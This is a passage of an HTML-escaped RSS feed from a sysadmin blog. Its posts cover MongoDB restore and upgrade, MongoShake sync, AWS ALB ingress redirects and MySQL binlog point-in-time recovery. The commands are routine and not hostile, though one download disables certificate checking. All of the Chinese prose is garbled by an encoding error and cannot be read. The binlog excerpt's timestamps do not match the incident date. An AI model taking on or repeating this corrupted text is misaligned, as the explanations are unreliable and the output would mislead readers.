&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   --host&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.111.222 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   --port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;27017&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   --username&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;root &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   --authenticationDatabase&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;admin &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   --nsExclude&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;admin &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   /root/dump
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; ctrl+a+d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å…¶å®åˆšå¼€å§‹çº¿ä¸‹ä¸‰èŠ‚ç‚¹å¾—é…ç½®æ˜¯8Gï¼Œç„¶åæ¢å¤ç”¨äº†ä¸€æ™šï¼ŒæŠ¥é”™ï¼Œç›´æ¥æŠŠshard3ç»™æ‰“å´©äº†ï¼Œè™½ç„¶ä¸‰èŠ‚ç‚¹éƒ½æ˜¯dockerå¯åŠ¨å¾—ï¼Œæœ‰è‡ªåŠ¨æ¢å¤æœºåˆ¶ï¼Œä½†æ˜¯mongorestoreå¯ä¸ç®¡è¿™ä¸ªï¼Œä¸­æ–­æœŸé—´æœ‰1000ä¸ªDocumentæ²¡æœ‰æ¢å¤æˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;é‡è¯•äº†2æ¬¡åæ‰å‘ç°è¿™é—®é¢˜ï¼Œ2å¤©å·²ç»è¿‡å»äº†ï¼Œæ„è¯†åˆ°å°±ç«‹åˆ»æŠŠå†…å­˜æå‡åˆ°32Gï¼Œå†æ¬¡è¿›è¡Œæ¢å¤ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æ–°å»ºçš„é›†ç¾¤çš„å¯†ç è·Ÿæºåº“è¿™æ—¶æ˜¯ä¸ä¸€è‡´çš„ï¼Œåˆä¸€å¤©è¿‡å»äº†ï¼ŒDocumentæ–‡æ¡£æ˜¯æ¢å¤å®Œæ¯•ï¼ŒIndexåˆæ— æ³•å»ºç«‹ï¼Œå› ä¸ºç”¨æˆ·åå’Œå¯†ç ä¸ä¸€è‡´ï¼ŒFuckï¼&lt;/p&gt;
&lt;p&gt;åˆåŒå’å†æ¬¡å¼€å§‹æ¢å¤ï¼Œè¿™ä¸‹å¤©ä¸‹å¤§å‰äº†ï¼Œç„¶åè¿™è¿˜ä¸ç®—å®Œï¼&lt;/p&gt;
&lt;p&gt;restoreåï¼Œå…¶å®åˆè¿‡äº†ä¸€å¤©ï¼Œé‚£è¦è¿½å¹³ä¹‹åçš„æ•°æ®ï¼Œå°±å¾—ç”¨ä¸Šå®æ—¶åŒæ­¥å·¥å…·äº†ï¼Œè¿™é‡Œç”¨çš„æ˜¯é˜¿é‡Œçš„mongoshake&lt;/p&gt;
&lt;p&gt;ä¸‹è½½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/alibaba/MongoShake/releases/download/release-v2.8.5-20250403/mongo-shake-v2.8.5.tgz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf mongo-shake-v2.8.5.tgz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; mongo-shake-v2.8.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://raw.githubusercontent.com/alibaba/MongoShake/refs/heads/develop/conf/collector.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬éœ€è¦æ³¨æ„&lt;code&gt;collector.conf&lt;/code&gt;çš„ä»¥ä¸‹åœ°æ–¹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>mongodb å¦‚ä½•å‡çº§</title>
      <link>https://rendoumi.com/posts/20250122-mongodb_upgrade/</link>
      <pubDate>Wed, 22 Jan 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250122-mongodb_upgrade/</guid>
      <description>&lt;p&gt;mongodb å…¬å¸ç°åœ¨è¿è¡Œçš„ç‰ˆæœ¬æ˜¯mongodb 4.2.19ï¼Œåœ¨å¤„ç†allowDiskUseçš„æ—¶å€™å¤±è´¥&lt;/p&gt;
&lt;p&gt;å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œä¼¼ä¹å¦å¤–ä¸€ä¸ªé›†ç¾¤è·‘çš„æ˜¯5.0.5ï¼Œå°±æ²¡æœ‰é—®é¢˜&lt;/p&gt;
&lt;p&gt;é‚£å°±å‡çº§ä¸€ä¸‹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;é¦–å…ˆä¸‹è½½ 5.0.30&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget --no-check-certificate https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian11-5.0.30.tgz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åè§£å‹å¼„å¥½ï¼Œå‡†å¤‡å¥½mongodb.conf&lt;/p&gt;
&lt;p&gt;dumpä¸‹æ¥è€æ•°æ®ï¼Œä¸åŠ Â·&amp;ndash;quietÂ·çš„å‚æ•°æœ‰å¯èƒ½ä¼šé‡åˆ°&lt;code&gt;EOF&lt;/code&gt;çš„é”™è¯¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir mongobackup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; mongobackup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mongodump --quiet
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ€æ‰4.2.19ï¼Œå¯åŠ¨5.0.30ï¼ŒæŠŠæ•°æ®å›çŒå›å»ï¼ŒåŒæ ·è¦ç”¨&lt;code&gt;--quiet&lt;/code&gt;å‚æ•°&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; mongobackup
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mongorestore --quiet
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·å°±OKäº†ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼Œmongo æ˜¯åƒå†…å­˜å¤§æˆ·ï¼Œå¦‚æœå¤‡ä»½ä¸ä¸‹æ¥ï¼Œæˆ–è€…æ¢å¤ä¸è¿›å»ï¼Œè¯·å¢åŠ å†…å­˜ã€‚&lt;/p&gt;
&lt;p&gt;æ›¾æœ‰è¿‡ä¸€æ¬¡ï¼Œ8G-&amp;gt;16G-&amp;gt;32G æ‰æˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;è€Œä¸”å¿…é¡»ä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œå¤‡ä»½ï¼Œä¸€ä¸ªä¸€ä¸ªdbè¿›è¡Œæ¢å¤ï¼Œè®°å¾—å¤‡ä»½ admin æ•°æ®åº“&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mongodump -d message
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mongorestore --port &lt;span class=&#34;m&#34;&gt;37017&lt;/span&gt; --drop --nsInclude&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;message.*
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>AWS alb è´Ÿè½½å‡è¡¡åšingressçš„æ³¨æ„äº‹é¡¹</title>
      <link>https://rendoumi.com/posts/20250120-aws_alb_ingress/</link>
      <pubDate>Mon, 20 Jan 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250120-aws_alb_ingress/</guid>
      <description>&lt;p&gt;ç®¡ç†äº†ä¸€ä¸ªAWSçš„EKSé›†ç¾¤ï¼Œç”¨çš„æ˜¯ALBçš„è´Ÿè½½å‡è¡¡ï¼Œè¿™ä¸ªè´Ÿè½½å‡è¡¡å’ŒNginxæœ‰åŒºåˆ«ï¼Œæœ‰å¾ˆå¤šç‰¹æ®Šçš„åœ°æ–¹éœ€è¦æ³¨æ„ã€‚&lt;/p&gt;
&lt;p&gt;åŸºæœ¬éœ€è¦å®£å‘Šå¾ˆå¤šç‹¬æœ‰çš„ annotations&lt;/p&gt;
&lt;h4 id=&#34;ä¸€httpè‡ªåŠ¨è·³è½¬åˆ°https&#34;&gt;ä¸€ã€httpè‡ªåŠ¨è·³è½¬åˆ°https&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  annotations:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    alb.ingress.kubernetes.io/actions.ssl-redirect: &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Type&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;redirect&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;RedirectConfig&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Protocol&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTPS&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;Port&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;443&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;StatusCode&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP_301&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  - host: &lt;span class=&#34;s1&#34;&gt;&amp;#39;*.bajie.dev&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    http:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      paths:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - backend:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          service:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            name: ssl-redirect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            port:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              name: use-annotation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        path: /
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        pathType: Prefix     
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œannotationäº†ä¸Šé¢ä¸€æ¡ï¼Œé‚£ä¹ˆåœ¨LBä¸­ï¼Œhttp 80çš„è§„åˆ™å°±åªå‰©ä¸‹è¿™ä¸€æ¡äº†ï¼Œå‹å€’ä¸€åˆ‡çš„è§„åˆ™ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹åä½ å†annotationåˆ«çš„httpè§„åˆ™ï¼Œä¼šä¸ç”Ÿæ•ˆï¼›ä½ åªèƒ½å»annotition httpsçš„è§„åˆ™ã€‚&lt;/p&gt;
&lt;h4 id=&#34;äºŒwwwé‡å®šå‘&#34;&gt;äºŒã€wwwé‡å®šå‘&lt;/h4&gt;
&lt;p&gt;ä¾‹å­ï¼š  è¾“å…¥ rendoumi.comï¼Œä¼šè‡ªåŠ¨é‡å®šä¹‰åˆ° &lt;a href=&#34;https://www.rendoumi.com&#34;&gt;www.rendoumi.com&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  annotations:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    alb.ingress.kubernetes.io/actions.www-redirect: &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;redirect&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;redirectConfig&amp;#34;&lt;/span&gt;:&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;www.rendoumi.com&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;443&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;protocol&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTPS&amp;#34;&lt;/span&gt;,&lt;span class=&#34;s2&#34;&gt;&amp;#34;statusCode&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP_301&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  - host: rendoumi.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    http:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      paths:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - backend:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          service:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            name: www-redirect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            port:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              name: use-annotation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        path: /
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        pathType: Prefix
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ˜¯ç›´æ¥301è·³è½¬åˆ°httpså»äº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>Mysqlçš„æŸä¸ªè¡¨æ¢å¤åˆ°æŸä¸€ä¸ªæ—¶é—´ç‚¹çš„æ“ä½œ</title>
      <link>https://rendoumi.com/posts/20250103-msyql_restore/</link>
      <pubDate>Fri, 03 Jan 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250103-msyql_restore/</guid>
      <description>&lt;p&gt;åŒäº‹ä¸Šçº¿ï¼ŒæŠŠæ•°æ®åº“åˆå§‹åŒ–è„šæœ¬æ”¹äº†åã€‚ç»“æœå¯¼è‡´ä¸Šçº¿æŠŠåº“è¡¨çš„æ•°æ®å…¨ç»™é‡æ–°åˆå§‹åŒ–äº†ã€‚è¿™ä¸‹äº‹æ¥äº†ï¼Œæ¢å¤åº“è¡¨ã€‚&lt;/p&gt;
&lt;p&gt;ä¹‹å‰ç”¨è¿‡é˜¿é‡Œäº‘çš„åº“è¡¨æ¢å¤ï¼Œéå¸¸ç®€æ´ï¼Œé‚£è¿™æ¬¡ä¹Ÿç…§çŒ«ç”»è™å­¦ä¸€å›ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€ä¿å­˜ç°åœ¨çš„è®°å½•ï¼š&lt;/p&gt;
&lt;p&gt;æŠŠæ‰€æœ‰ç›¸å…³çš„binlogæ‹·è´åˆ°ä¸€ä¸ªå¤‡ä»½ç›®å½•ä¿å­˜ã€‚&lt;/p&gt;
&lt;p&gt;äºŒã€æœ€å¥½æ–°å»ºä¸€ä¸ªmysqlå®ä¾‹ï¼š&lt;/p&gt;
&lt;p&gt;é˜¿é‡Œç¡®å®äº‹æ–°èµ·äº†ä¸€ä¸ªå®ä¾‹ï¼Œé¿å…æ“ä½œå¯¹æ—§å®ä¾‹é€ æˆå½±å“ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å®æˆ˜ä¸­å¯èƒ½æ²¡å¿…è¦ï¼Œä½†ä¹Ÿè¦å°é”æ•°æ®åº“çš„è¯»å†™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -I INPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;3306&lt;/span&gt; -j DROP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æŠŠè‡ªå·±æ”¾é€šï¼Œåç»­å¯èƒ½è‡ªå·±è¦è¿›è¡Œ mysql æˆ– mysqldump çš„æ“ä½œ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;iptables -I INPUT -s 127.0.0.1/32 -p tcp --dport &lt;span class=&#34;m&#34;&gt;12530&lt;/span&gt; -j ACCEPT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€è§£æbinlog&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦æŠŠé‡æ”¾æ—¥å¿—æ‹¿å‡ºæ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqlbinlog --start-datetime&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2025-01-02 14:40:00&amp;#34;&lt;/span&gt; --stop-datetime&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2025-01-02 14:50:00&amp;#34;&lt;/span&gt; --verbose binlog.000009 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -i -C15 &lt;span class=&#34;s2&#34;&gt;&amp;#34;drop table&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;more
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysqlbinlog binlog.000009 --stop-position&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;260734003&lt;/span&gt; --database&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;work_oa &amp;gt; 9.sql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æ³¨æ„ï¼Œåˆ†æï¼šçœ‹åˆ° at &lt;span class=&#34;m&#34;&gt;260734003&lt;/span&gt; ä¸‹é¢æœ‰ä¸ª drop table ï¼Œè¯´æ˜æ˜¯åœ¨ &lt;span class=&#34;m&#34;&gt;260734003&lt;/span&gt; ä¹‹åå‘ç”Ÿäº† drop table æ“ä½œ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æ‰€ä»¥ï¼Œå›æ”¾åˆ°260734003å°±å¯ä»¥äº†ã€‚ä¹‹åã€ä¹‹åã€ä¹‹åæ‰æ“ä½œçš„ï¼ï¼ï¼
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80014 SET @@session.original_server_version&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80019*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*!80014 SET @@session.immediate_server_version&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80019*//*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@SESSION.GTID_NEXT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ANONYMOUS&amp;#39;&lt;/span&gt;/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# at 260734003&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#200311 20:06:20 server id 1  end_log_pos 355 CRC32 0x2fc1e5ea 	Query	thread_id=16	exec_time=0	error_code=0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET &lt;span class=&#34;nv&#34;&gt;TIMESTAMP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1583971580/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.pseudo_thread_id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;16/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SET @@session.foreign_key_checks&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1, @@session.sql_auto_is_null&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0, @@session.unique_checks&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1, @@session.autocommit&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1/*!*/&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
